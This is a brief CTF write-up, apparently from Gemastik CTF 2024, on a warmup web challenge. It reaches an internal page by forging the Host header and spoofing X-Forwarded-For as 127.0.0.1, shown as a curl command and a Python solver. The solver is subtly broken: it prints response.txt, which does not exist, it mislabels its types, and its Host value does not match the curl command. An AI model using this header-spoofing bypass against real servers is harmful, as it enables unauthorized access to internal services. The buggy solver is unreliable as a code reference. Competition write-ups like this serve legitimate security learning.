---
description: Gemastik CTF 2024 (UNNES) warmup writeup.
icon: fire
cover: >-
  https://images.unsplash.com/photo-1597733336794-12d05021d510?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHwzfHxuZXR3b3JrfGVufDB8fHx8MTc0MDg3NTc3Mnww&ixlib=rb-4.0.3&q=85
coverY: 0
---

# Warmup

## 1. Internal Page (Web - Easy)

### 1.1. Description

* Basically, challenge ini seperti judulnya, yaitu pemanasan dengan melakukan request ke internal domain dari website challenge gemastik.
* Dengan tambahan HTTP header `X-Forwarded-For`, kita bisa memanipulasi request supaya bisa seolah-olah request dari localhost.

### 1.2. POC using cURL

{% code overflow="wrap" %}
```bash
curl -H "Host: internal.gemastik" -H "X-Forwarded-For: 127.0.0.1" ctf.gemastik.id:9005
```
{% endcode %}

### 1.3. POC using Python

{% code title="solver.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/local/python/3.13.1/bin/python3.13.1

import requests

URL: str = "http://ctf.gemastik.id:9005"
headers: dict = {"Host": "internal.gemastik.puspresnas.go.id", "X-Forwarded-For": "127.0.0.1"}

response: str = requests.get(URL, headers=headers)
status_code: int = response.status_code
if status_code == 200:
	print(response.txt)
	print(response.headers)
else:
	print("Failed!")
```
{% endcode %}

## Other Warmup Challenges

All warmup challenges can be see at the following url:

[https://oto.lv.tab.digital/s/sSwGJYxbYdrj3qN](https://oto.lv.tab.digital/s/sSwGJYxbYdrj3qN)

***

**Tags**: #ctf, #web-exploitation, #warmup
